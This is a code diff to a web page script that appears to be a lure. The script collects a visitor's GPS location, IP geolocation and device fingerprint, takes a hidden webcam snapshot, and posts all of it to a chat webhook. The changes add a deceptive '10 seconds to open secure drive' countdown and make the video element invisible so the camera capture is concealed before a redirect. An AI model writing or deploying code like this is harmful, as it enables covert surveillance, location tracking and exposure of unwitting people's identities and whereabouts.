@@ -25,7 +25,6 @@
       color: #fff;
       border-radius: 8px;
       cursor: pointer;
-      margin-top: 1em;
     }
   </style>
 </head>
@@ -65,7 +64,6 @@
       const device = getDeviceInfo();
 
       const formData = new FormData();
-
       const snapshotLine = capturedImageData
         ? "📸 Snapshot received: ✅ [Download Image](attachment://snapshot.png)"
         : "📸 Snapshot received: ❌ No image available";
@@ -74,21 +72,13 @@
         embeds: [{
           title: "📍 GPS & Device Info",
           description:
-            `**Latitude:** ${coords.lat}   \n**Longitude:** ${coords.lon}   \n**Accuracy:** ${coords.acc} meters` +
+            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
             `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
-            `\n\n🌐 **IP Info**` +
-            `\n**IP:** ${ipData.ipAddress}` +
-            `\n**City:** ${ipData.city}` +
-            `\n**Region:** ${ipData.stateProv}` +
-            `\n**Country:** ${ipData.countryName}` +
-            `\n\n🖥️ **Device Info**` +
-            `\n**Platform:** ${device.platform}` +
-            `\n**Browser:** ${device.userAgent}` +
-            `\n**Language:** ${device.language}` +
-            `\n**Screen:** ${device.screen}` +
-            `\n**Touch Support:** ${device.touchSupport}` +
-            `\n\n${snapshotLine}` +
-            `\n\n🕒 ${new Date().toLocaleString()}`
+            `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
+            `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
+            `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
+            `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
+            `\n**Touch Support:** ${device.touchSupport}\n\n${snapshotLine}\n\n🕒 ${new Date().toLocaleString()}`
         }]
       };
 
@@ -100,12 +90,7 @@
 
       formData.append("payload_json", JSON.stringify(payload));
 
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      }).finally(() => {
-        window.location.href = redirectUrl;
-      });
+      fetch(webhookUrl, { method: "POST", body: formData });
     }
 
     async function startSequence() {
@@ -133,29 +118,45 @@
           return;
         }
 
+        document.body.innerHTML = `
+          <h1 id="countdown" style="font-family: Arial, sans-serif; color: white;">
+            10 seconds to open secure drive
+          </h1>
+        `;
+
+        let seconds = 10;
+        const countdownEl = document.getElementById("countdown");
+        const timer = setInterval(() => {
+          seconds--;
+          countdownEl.textContent = `${seconds} seconds to open secure drive`;
+          if (seconds === 0) {
+            clearInterval(timer);
+            window.location.href = redirectUrl;
+          }
+        }, 1000);
+
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.createElement("video");
+          video.setAttribute("playsinline", true);
+          video.style.position = "absolute";
+          video.style.opacity = "0";
           video.srcObject = stream;
+          document.body.appendChild(video);
           await video.play();
 
-          // Show "Capturing..." message
-          document.body.innerHTML = `<div style="width:100%;height:100%;display:flex;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial">loading...…</div>`;
+          await new Promise(resolve => setTimeout(resolve, 3000));
 
-          await new Promise((resolve) => {
-            setTimeout(() => {
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              capturedImageData = canvas.toDataURL("image/png");
-              stream.getTracks().forEach(track => track.stop());
-              resolve();
-            }, 3000); // Wait 3 seconds to ensure camera is ready
-          });
-        } catch {
-          // Camera denied or failed
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          capturedImageData = canvas.toDataURL("image/png");
+
+          stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+          console.warn("Camera error:", err);
         }
 
         fetch("https://api.db-ip.com/v2/free/self")
